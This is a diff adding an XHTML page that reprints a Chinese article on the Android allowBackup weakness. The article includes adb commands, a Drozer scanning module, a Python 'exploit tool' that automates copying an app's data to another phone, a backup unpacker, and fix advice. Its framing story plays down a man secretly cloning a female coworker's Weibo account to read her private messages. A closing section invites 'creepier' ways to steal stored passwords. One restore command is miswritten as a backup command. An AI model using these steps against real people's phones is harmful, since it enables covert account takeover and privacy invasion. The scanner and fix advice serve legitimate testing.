@@ -1,0 +1,370 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>两分钟窃取身边女神微博帐号？</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>两分钟窃取身边女神微博帐号？</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=203456611&amp;idx=5&amp;sn=d933029ac5ce732eefee50cd4c702fb2&amp;chksm=1261e58725166c91342825b64ff82cf414b1954e32cafdfefd7f7b088867953e21d3e9df3375&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=203456611&amp;idx=5&amp;sn=d933029ac5ce732eefee50cd4c702fb2&amp;chksm=1261e58725166c91342825b64ff82cf414b1954e32cafdfefd7f7b088867953e21d3e9df3375&amp;scene=27#wechat_redirect</a></blockquote><p style="TEXT-ALIGN: center"/><p style="text-indent: 2em;">笔者在使用自己编写的Drozer模块对国内流行的安卓手机应用进行自动化扫描后发现有大量涉及用户财产和隐私的流行安卓应用存在Android 
+AllowBackup漏洞，已测试成功受到漏洞影响的应用包括：新浪微博，百度云网盘，美团，大众点评，去哪儿等等。</p><p style="text-indent: 2em;"><strong>[0x00] 漏洞案例</strong></p><p style="text-indent: 2em;">先来看一个情景案例，某IT男一直暗恋部门某女神，一天女神手机太卡了找IT男帮助清理手机空间，IT男高兴地答应女神两分钟搞定，屁颠屁颠的跑到自己电脑旁边连上手机，女神在一边呆呆的看着IT男敲了几行代码然后在手机上点了几下，最后果然两分钟不到就搞定了，在女神谢着离开后，IT男露出了WS的笑容。</p><p style="TEXT-ALIGN: center"><img title="wb" style="HEIGHT: 381px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9LIibzOEulOcosB6Ej07ms9el0d3qTAdyTprw1ahFnsLIwibcyW6f1ibJg/0" width="500" height="381" class="" id="c1426054495205" data-type="jpeg" data-ratio="0.762" data-w="500" src="../Images/a2b1424264b8c8875418432357345a0a.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9LIibzOEulOcosB6Ej07ms9el0d3qTAdyTprw1ahFnsLIwibcyW6f1ibJg/0"/></p><p style="text-indent: 2em;">没错，他成功了盗到了女神的微博帐号，终于不用问同事女神的微博帐号是多少了~当然这不是结局，一天晚上睡觉时，他看了女神的微博私信后心突然碎了。<br/></p><p style="text-indent: 2em;">到底发生了什么，这背后有啥不可告人的秘密？且看本文详细分析。</p><p style="text-indent: 2em;"><strong>[0x01] 漏洞背景</strong></p><p style="text-indent: 2em;">在谷歌2010年发布Android 2.2 Froyo 
+(冻酸奶)系统中，谷歌引入一个了系统备份的功能，允许用户备份系统应用和第三方应用的apk安装包和应用数据，以便在刷机或者数据丢失后恢复应用。 
+第三方应用开发者需要在应用的AndroidManifest.xml文件中配置allowBackup标志(默认为true)来设置应用数据是否能能够被备份或恢复。</p><p style="text-indent: 2em;">当这个标志被设置为true时应用程序数据可以在手机未获取ROOT的情况下通过adb调试工具来备份和恢复，这就允许恶意攻击者在接触用户手机的情况下在短时间内启动手机USB调试功能来窃取那些能够受到AllowBackup漏洞影响的应用的数据，造成用户隐私泄露甚至财产损失。</p><p style="text-indent: 2em;">使用反编绎工具JEB查看weibo客户端manifest配置：</p><p style="TEXT-ALIGN: center"><img title="jebmanifest" style="HEIGHT: 69px; WIDTH: 600px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9yj0zLXGDYdqkGmt6yH70HZOsDd2NYE0Vlam6GRCT4eqSOndpexvJSA/0" width="600" height="69" class="" id="c1426054495206" data-type="jpeg" data-ratio="0.11439842209072978" data-w="507" src="../Images/c0c8bc4a4039d06f76ffb22c57c5243c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9yj0zLXGDYdqkGmt6yH70HZOsDd2NYE0Vlam6GRCT4eqSOndpexvJSA/0"/></p><p style="text-indent: 2em;">在之前的案例正是因为新浪微博安卓客户端(最新版)AndroidManifest.xml并没有配置 
+android:allowBackup=“false”，导致女神手机中的微博客户端数据可以在短时间内通过ADB调试备份到电脑中最后恢复到IT男手机，然后IT男以后每天就可以用女神的帐号看女神发了啥微博和私信内容。</p><p style="text-indent: 2em;">当然可利用的场景当然不止于此，想想，如果存在漏洞的是你的团购应用呢（看看有啥团购券我先来用吧），当然还有你的网盘应用（说不定可以看女神的私密照~），哦，对了连社交和理财应用也不能放过（女神们还敢把手机给IT男清理不）。。。</p><p style="text-indent: 2em;"><strong>[0x02] 检测方法</strong></p><p style="text-indent: 2em;">（1）手工检测</p><p style="text-indent: 2em;">测试环境：</p><p style="text-indent: 2em;">1.Windows 7，ADB调试工具</p><p style="text-indent: 2em;">2.物理接触目标手机1，连接手机1到PC端</p><p style="text-indent: 2em;">3.手机1和手机2均未被ROOT，开启USB调试</p><p style="text-indent: 2em;">4.不用安装其它应用，不启动被测试的应用</p><p style="text-indent: 2em;">测试流程：</p><p style="text-indent: 2em;">1.连接安装开启USB调试手机1 到PC端</p><p style="text-indent: 2em;">2.在PC自动（也可以提前）安装好手机驱动后</p><p style="text-indent: 2em;">3.启动命令行界面输入以下命令：</p><p style="text-indent: 2em;"><br/></p><pre class="brush:bash;toolbar:false">#adb devices
+显示已连接的设备列表，测试手机是否正常连接
+#adb backup -nosystem -noshared -apk -f com.sina.weibo.ab com.sina.weibo
+-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -apk表示备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName</pre><p style="text-indent: 2em;">4.点击手机1确认备份界面的“备份我的数据”</p><p style="text-indent: 2em;">5.等待备份完成，至此微博客户端数据成功备份为com.sina.weibo.ab文件</p><p style="text-indent: 2em;">6.断开手机1的连接，可以把手机还给女神啦</p><p style="text-indent: 2em;">7. 连接手机2 ，在命令行界面下输入以下命令：</p><pre class="brush:bash;toolbar:false">#adb kill-server  
+关闭ADB
+#adb devices 
+重新启动ADB，检测手机2是否成功连接 
+#adb backup com.sina.weibo.ab</pre><p style="text-indent: 2em;">8.点击手机2确认恢复界面的“恢复我的数据”</p><p style="text-indent: 2em;">9.等待恢复完成</p><p style="text-indent: 2em;">10.打开手机2中新安装的微博客户端，测试可正常登录手机1中帐号执行各种操作，且长期有效。</p><p style="text-indent: 2em;"><strong>（2）在线检测</strong></p><p style="text-indent: 2em;">目前国内三个主要的Android应用漏洞在线检测系统均能较好的检测此漏洞，建议普通用户和开发者使用腾讯金刚审计系统上传应用安装包进行检测。</p><p style="text-indent: 2em;">1.腾讯金刚审计系统检测结果（ 
+http://service.security.tencent.com/kingkong ）</p><p style="TEXT-ALIGN: center"><img title="kingkongscan" style="HEIGHT: 120px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9BW9PtfxvaSlGNjaNZNy6ugNwNqWFIsUVAG4XiaQxSpuVpbMmWq1eqdA/0" width="500" height="120" class="" id="c1426054495207" data-type="jpeg" data-ratio="0.24" data-w="500" src="../Images/5f3f889d1107fb3cf83629ef4558f34f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9BW9PtfxvaSlGNjaNZNy6ugNwNqWFIsUVAG4XiaQxSpuVpbMmWq1eqdA/0"/></p><p style="text-indent: 2em;">2.阿里聚安全检测结果（ 
+http://jaq.alibaba.com/ ）</p><p style="TEXT-ALIGN: center"><img title="aliscan" style="HEIGHT: 76px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9fG73zbcCFM7ljIlOOS9scYkpUVM3hSmT98lefUibXtK5AHmGWNeoWZA/0" width="500" height="76" class="" id="c1426054495208" data-type="jpeg" data-ratio="0.15" data-w="500" src="../Images/0b5245b0ca980fbde4772e25c2b32a43.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9fG73zbcCFM7ljIlOOS9scYkpUVM3hSmT98lefUibXtK5AHmGWNeoWZA/0"/></p><p style="text-indent: 2em;">3.360捉虫猎手检测结果（ 
+http://appscan.360.cn/ ）</p><p style="TEXT-ALIGN: center"><img title="360scan" style="HEIGHT: 123px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9ShcBmHVwiaiajUaE965u6qc9fUkvJXreq5WfE6B6b7OibYQdDfWLmPsPA/0" width="500" height="123" class="" id="c1426054495209" data-type="jpeg" data-ratio="0.246" data-w="500" src="../Images/995c15cdfb7ad4d4db44dc73b12da7ff.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9ShcBmHVwiaiajUaE965u6qc9fUkvJXreq5WfE6B6b7OibYQdDfWLmPsPA/0"/></p><p style="text-indent: 2em;"><strong>[0x03] 影响范围</strong></p><p style="text-indent: 2em;">目前测试了手上一台安装有Android 
+4.1.1系统的魅族MX2手机和安装有Android 4.4.2系统的魅族MX4手机均测试成功，理论上影响Android 2.2-Android 
+4.4系统中存在风险的应用。</p><p style="text-indent: 2em;">建议评级：</p><p style="text-indent: 2em;">尽管此漏洞的利用条件较高，需要物理接触，但此漏洞对涉及用户财产与隐私类的APP来说杀伤力较大，建议厂商视情况修复。</p><p style="text-indent: 2em;">1.金融类APP 高危</p><p style="text-indent: 2em;">2.支付类APP 高危</p><p style="text-indent: 2em;">3.团购类APP 中危</p><p style="text-indent: 2em;">4.社交类APP 中危</p><p style="text-indent: 2em;">5.网盘类APP 中危</p><p style="text-indent: 2em;">6.其它类APP 低危/无影响</p><p style="text-indent: 2em;"><strong> [0x04] 修复方案 </strong></p><p style="text-indent: 2em;">开发者如要避免应用数据泄露的风险，应当在设置AndroidManifest.xml 
+文件中配置android:allowBackup=“false”，此时应用程序数据无法被备份和恢复。或者在应用启动时检测手机硬件和网络环境是否改变，如果存在异常则强制退出或重新登录。</p><p style="text-indent: 2em;"> <strong>[0x05] 
+编写Drozer模块实现漏洞自动化扫描</strong></p><p style="text-indent: 2em;">Drozer是MWR 
+InfoSecurity公司开发的一款安卓应用安全评估框架，其社区版开源在Github上（https://github.com/mwrlabs/drozer 
+）。对于从事安卓应用漏洞测试的安全研究者们来说，他们可以使用drozer提供的框架自己编写模块(Module)方便对的安卓应用进行漏洞检测与利用。</p><p style="text-indent: 2em;">以下是自己编写一个Drozer 
+Module，用于自动化批量检测手机中的哪些应用存在AllowBackup风险。</p><p style="text-indent: 2em;"><br/></p><pre class="brush:python;toolbar:false">import re
+ 
+from drozer import android
+ 
+from drozer.modules import common, Module
+ 
+class AbChecker(Module, common.Assets,common.PackageManager):
+ 
+    name = "check if app can be backup and restore by usb debugging"
+ 
+    description = "see:htttp://www.droidsec.cn"
+ 
+    examples ="""
+ 
+    dz&gt; run scanner.misc.abchecker -a
+ 
+    -&gt; it will run the script to check all apps
+ 
+    dz&gt; run scanner.misc.abchecker -p com.android.chrome
+ 
+    -&gt; it will run the script to check the provided package
+ 
+    """
+ 
+    author = "DroidSec.cn"
+ 
+    date = "2015-03-07"
+ 
+    license = "BSD (3-clause)"
+ 
+    path = ["scanner", "misc"]
+ 
+    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
+ 
+    VULNERABLE_API = 'android:allowBackup="true"'
+ 
+    
+ 
+    def add_arguments(self, parser):
+ 
+        parser.add_argument("-p", dest="pkg",help="the identifier of the package")
+ 
+        parser.add_argument("-a", action="store_true",dest="all",help="the identifier of the package")
+ 
+    def execute(self, arguments):
+ 
+        if arguments.pkg != None:
+ 
+            #self.stdout.write(arguments.pkg)
+ 
+            self.__write_manifest(arguments.pkg)
+ 
+        elif arguments.all == True:
+ 
+            self.stdout.write("[color yellow] Start scan[/color]"+"\n")
+ 
+            for package in self.packageManager().getPackages(common.PackageManager.GET_PERMISSIONS):
+ 
+                try:
+ 
+                    self.__write_manifest(package.packageName)
+ 
+                except Exception, e:
+ 
+                    print str(e)
+ 
+            self.stdout.write("[color yellow] Scan finish[/color]"+"\n")
+ 
+    def __write_manifest(self, package):
+ 
+        lines=self.getAndroidManifest(package).split("\n")
+ 
+        r1=re.compile(r'\&lt;application')
+ 
+        r2=re.compile(r'allowBackup="false"')
+ 
+        vulnerable=0
+ 
+        for line in lines:
+ 
+            line = str(line)
+ 
+            isApplicationTag=re.search(r1,line)
+ 
+            if isApplicationTag != None:
+ 
+                isAllowBackup=re.search(r2,line)
+ 
+                    #self.stdout.write(line+"\n")
+ 
+                if isAllowBackup == None:
+ 
+                    self.stdout.write("[color red] %s is vulnerable[/color]"%package+"\n")
+ 
+                else:
+ 
+                        continue
+ 
+            else:
+ 
+                continue</pre><p style="text-indent: 2em;">运行截图：</p><p style="text-indent: 2em;">  </p><p style="TEXT-ALIGN: center"><img title="drozer1" style="HEIGHT: 380px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9tU6BpfuxP3aqGWB4DR3ibnAmKwo8ia0wu74ap3QoBnib3OPLsHHlYVxfg/0" width="500" height="380" class="" id="c1426054495210" data-type="jpeg" data-ratio="0.76" data-w="500" src="../Images/2f996eab705116390f78e6276a09fab5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9tU6BpfuxP3aqGWB4DR3ibnAmKwo8ia0wu74ap3QoBnib3OPLsHHlYVxfg/0"/></p><p style="text-indent: 2em;">注意事项：</p><p style="text-indent: 2em;">此drozer 
+module检测原理是匹配应用manifest文件中是否配置了allowBackup=“false”来判断应用数据是否可备份和恢复，实际测试会发现一部分应用能成功备份和恢复但就是无法登录（比如手机淘宝和京东客户端），这说明厂商已经考虑到此设置可能带来的安全风险，并做出了相应限制，此类应用是安全的。</p><p style="text-indent: 2em;"><strong>[0x06] 
+编写Python脚本实现自动攻击与利用</strong></p><p style="text-indent: 2em;">1.如上文所述，整个漏洞测试过程中需要输入不少命令，对于手速慢和不习惯敲命令的人来说还是略麻烦了点，所以我们可以编写Python脚本来实现自动化攻击和利用。</p><pre class="brush:bash;toolbar:false">#!/usr/bin/python
+ 
+#coding:utf8
+ 
+import commands
+ 
+import re,sys
+ 
+from optparse import OptionParser
+ 
+def usage():
+ 
+    print '''
+ 
+    ------------------------------------------------------------------
+ 
+                Android Application AllowBackup Exploit Tool
+ 
+    Usage:DroidSec_AbHack.py -p com.xxx.xxx(packageName) -b (backup)
+ 
+          DroidSec_AbHack.py -p com.xxx.xxx(packageName) -r (restore)
+ 
+    How to check the  security vulnerabilities of application?
+ 
+    Go to the professional Android security Website!
+ 
+                    =&gt;  http://www.droidsec.cn 
+ 
+    ------------------------------------------------------------------
+ 
+    '''
+ 
+class AbHack:
+ 
+    def __init__(self,adb,pkg):
+ 
+        self.adbdir=adb
+ 
+        self.package=pkg
+ 
+    def getinfo(self):
+ 
+        (status,output)=commands.getstatusoutput(self.adbdir+'devices')
+ 
+        r=re.findall('device',output)
+ 
+        if len(r) &gt;= 2:
+ 
+            return "ok"
+ 
+        else:
+ 
+            return "waiting"
+ 
+    def backup(self):
+ 
+        if self.getinfo()=="ok":
+ 
+            print "Start backup......"
+ 
+            output=commands.getoutput(str(self.adbdir)+"backup -nosystem -noshared -apk -f "+str(self.package)+".ab "+str(self.package))
+ 
+            print output
+ 
+            print "backup success!"
+ 
+        else:
+ 
+            print "Please connect your mobile phone(usb debugging must been enabled) or check the ADB directory is configurd properly"
+ 
+    def restore(self):
+ 
+        commands.getstatusoutput(self.adbdir+"kill-server") 
+ 
+        if self.getinfo()=="ok":
+ 
+            print "start restore..."
+ 
+            output=commands.getoutput(str(self.adbdir)+"restore "+str(self.package)+".ab")
+ 
+            print output
+ 
+        else:
+ 
+            print "Please connect your mobile phone(usb debugging must been enabled) or check the ADB directory is configured properly"
+ 
+if __name__ == "__main__":
+ 
+    adbdir="/Users/nickycc/Downloads/adt-bundle-mac/sdk/platform-tools/adb " #please set the ADB file directory before use
+ 
+    parser = OptionParser()
+ 
+    parser.add_option("-p", action="store", dest="pkg")
+ 
+    parser.add_option("-b", action="store_true",dest="abhack")
+ 
+    parser.add_option("-r", action="store_false",dest="abhack")
+ 
+    (options, args) = parser.parse_args()
+ 
+    usage()
+ 
+    if len(sys.argv) &lt;=1:
+ 
+        sys.exit()
+ 
+    elif options.abhack==True:
+ 
+        Backup=AbHack(adbdir,options.pkg)
+ 
+        Backup.backup()
+ 
+    elif options.abhack==False:
+ 
+        Restore=AbHack(adbdir,options.pkg)
+ 
+        Restore.restore()
+ 
+    else:
+ 
+        sys.exit()</pre><p style="text-indent: 2em;">运行截图：</p><p style="TEXT-ALIGN: center"><img title="backup1" style="HEIGHT: 205px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt94dkic3BTVibC4YkicjDjiaytuXDiaV1NAShI2FVdpfjibrpRokmySphBxzCg/0" width="500" height="205" class="" id="c1426054495211" data-type="jpeg" data-ratio="0.41" data-w="500" src="../Images/465db448d9447ad1626a548f669f0bb7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt94dkic3BTVibC4YkicjDjiaytuXDiaV1NAShI2FVdpfjibrpRokmySphBxzCg/0"/></p><p style="TEXT-ALIGN: center"><img title="restore" style="HEIGHT: 197px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt947qcEDq4rl5DU1Rgc1oOAQIG0LbyuuYAbdoI7yOS5J4fwKALLrb9Nw/0" width="500" height="197" class="" id="c1426054495212" data-type="jpeg" data-ratio="0.392" data-w="500" src="../Images/648718cf2325fdcbacb05ff940938f7f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt947qcEDq4rl5DU1Rgc1oOAQIG0LbyuuYAbdoI7yOS5J4fwKALLrb9Nw/0"/></p><p style="text-indent: 2em;">2.应用备份生成的.ab文件其实是可以解包的，解包后的目录结构如下：</p><p style="TEXT-ALIGN: center"><img title="1F5116A2-C43C-43F8-8266-BA124C9DC926" style="HEIGHT: 152px; WIDTH: 500px" border="0" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9HBhB0vOOFMFwkFv3QBoj66n8sjkB7sz9a88LKHTBMT8nGrYVAnpuiaw/0" width="500" height="152" class="" id="c1426054495213" data-type="jpeg" data-ratio="0.304" data-w="500" src="../Images/24e0f31b5ae6a986ad24472110a76343.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLicxia593XzyaXEtkpNOzXDt9HBhB0vOOFMFwkFv3QBoj66n8sjkB7sz9a88LKHTBMT8nGrYVAnpuiaw/0"/></p><p style="text-indent: 2em;">分别对应了androidmanifest.xml，apk安装包，database目录，files目录，其它目录以及shared_prefs目录，我们可以通过解包来对窃取的应用数据进一步分析。</p><p style="text-indent: 2em;">解包的python脚本如下：</p><pre class="brush:python;toolbar:false"># coding=utf-8
+ 
+import argparse
+ 
+import os
+ 
+import sys
+ 
+import zlib
+ 
+C_BUFFER_SIZE = 1048576
+ 
+def ArgParse():
+ 
+    """
+ 
+    Parses the command line arguments
+ 
+    :return: argparse dictionary
+ 
+    """
+ 
+    # parse command line arguments
+ 
+    parser = argparse.ArgumentParser(
+ 
+        description="xbackup: extracts an Android ICS+ backup file.")
+ 
+    parser.add_argument("ipath",
+ 
+                        help="Input path.")
+ 
+    parser.add_argument("opath",
+ 
+                        help="output path.")
+ 
+    args = parser.parse_args()
+ 
+    return args
+ 
+def Extract(args):
+ 
+    """
+ 
+    Extracts the .tar file of an Android Backup. Assumes the backup is not encrypted and is
+ 
+    compressed.
+ 
+    :param args:
+ 
+    :return:
+ 
+    """
+ 
+    ifile = open(args.ipath, "rb")
+ 
+    ofile = open(args.opath, "wb")
+ 
+    data = ifile.read(C_BUFFER_SIZE)
+ 
+    print data
+ 
+    pos = data.find("none\n") + 5
+ 
+    data = data[pos:]
+ 
+    dc = zlib.decompressobj()
+ 
+    while data:
+ 
+        ofile.write(dc.decompress(data))
+ 
+        data = ifile.read(C_BUFFER_SIZE)
+ 
+    ifile.close()
+ 
+    ofile.close()
+ 
+def main():
+ 
+    args = ArgParse()
+ 
+    if os.path.isfile(args.ipath):
+ 
+        Extract(args)
+ 
+    else:
+ 
+        print "Could not open input file!."
+ 
+        return 1
+ 
+    return 0
+ 
+if __name__ == "__main__":
+ 
+    sys.exit(main())</pre><p><br/></p><p style="text-indent: 2em;"><strong>[0x07] 
+更多猥琐流利用方法</strong></p><p style="text-indent: 2em;">国外安全公司PALO 
+ALTO早在2014年8月就发过研究报告称超过94%的流行应用存在此漏洞， 大牛Claud 
+Xiao更是在去年Hitcon会议分享过与此有关的研究，如何让这个被很多人厂商视如鸡肋的漏洞有为猥琐的利用呢？这里提两点自己想到的，欢迎大家一起来交流 : 
+)</p><p style="text-indent: 2em;">（1）在APP漏洞里不安全的内部存储绝对是十分常见的漏洞，比如密码明文储存。笔者曾在测试某金融类APP时发现该APP在应用内部(/data 
+/data/com.xx.xx/shared_prefs/)存储了明文的手势密码(如下图中的lock.xml)，正常情况下如果用户手机是未 
+ROOT的，就算明文存储也没法获取到，漏洞影响相对较小，而继而我发现该理财APP同时存在allowbackup漏洞，也就是说我可以先将该应用数据备份到另一台已经获取ROOT手机，然后我不仅获得了用户帐号登录权限，连手势密码我都可以直接修改成任意（服务器端没做验证）或者相同（服务器端有验证）。还有一种情况是应用数据库中(/data/data/com.xx.xx/database/)直接存储了用户的登录帐号和密码那相当于直接利用 
+allowbackup盗得了用户帐户密码。</p><p style="text-indent: 2em;">（2）LastPass(一个用户密码管理工具）曾经被发现存在通过备份到其它手机来清除手势密码来登录获取用户储存在LastPass上的所有密码的漏洞（CVE-2013-5113 
+and 
+CVE-2013-5114）。发散一下思维，储存用户其它密码的还有哪些应用？对！浏览器，那些习惯了记住密码的用户很可能就会被存在漏洞的浏览器卖了。其它就看大家的更猥琐的发挥了~</p><p style="text-indent: 2em;"><strong>参考资料：</strong></p><p style="text-indent: 2em;">1. 
+https://www.paloaltonetworks.de/content/paloaltonetworks-com/global/cn_zh/index/company/press/2014/palo-alto-networks-unveils-security-risks-in-android-internal-storage.html</p><p style="text-indent: 2em;">2. 
+http://researchcenter.paloaltonetworks.com/2014/08/insecure-internal-storage-android/</p><p style="text-indent: 2em;">3.  
+http://developer.android.com/reference/android/R.attr.html#allowBackup</p><p style="text-indent: 2em;">4.  
+http://blog.c22.cc/2013/08/01/bsideslv-android-backup-unpacker-release/</p><p style="text-indent: 2em;">5.  
+http://nelenkov.blogspot.fi/2012/06/unpacking-android-backups.html</p><p style="text-indent: 2em;">6. 
+https://github.com/info-lab/ABX</p><p style="text-indent: 2em;">7. 
+https://github.com/mwrlabs/drozer</p><p><br/></p><p> </p><p><br/></p>
+        
+</body>
+</html>
